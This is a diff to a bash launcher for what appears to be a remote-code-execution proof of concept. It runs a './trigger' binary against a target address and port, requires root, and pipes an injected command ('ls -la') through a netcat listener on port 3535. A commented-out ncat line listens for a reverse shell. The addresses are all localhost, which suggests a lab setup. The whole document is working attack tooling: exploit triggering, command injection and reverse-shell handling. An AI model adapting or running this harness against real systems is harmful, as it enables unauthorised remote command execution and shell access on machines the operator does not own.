@@ -1,9 +1,38 @@
 #!/bin/bash
 
+DST_ADDR="127.0.0.1"
+DST_PORT="8080"
+RCE='ls -la'
+
+
+SRC_ADDR="127.0.0.1"
+SRC_PORT="3535"
+
+NCAT="/usr/bin/ncat"
+
+
 trigger(){
     sleep 1
-    ./trigger 127.0.0.1 127.0.0.1 8080
+    # ./trigger <source-ip> <target-ip> <port>
+    ./trigger ${SRC_ADDR} ${DST_ADDR} ${DST_PORT}
 }
 
+if [ "$EUID" -ne 0 ]
+  then echo "Permission denied."
+  exit
+fi
+
 trigger &
-ncat -lvp 3535
+
+
+# After the remote has been triggered
+# Send over the command to inject using netcat
+# reverse transmission.
+echo "Remote executing: ${RCE}"
+echo "nc -lp ${SRC_PORT}"
+${RCE} | nc -lp ${SRC_PORT}
+
+
+# Listen on 3535 for reverse shell
+#${NCAT} -lvp 3535
+
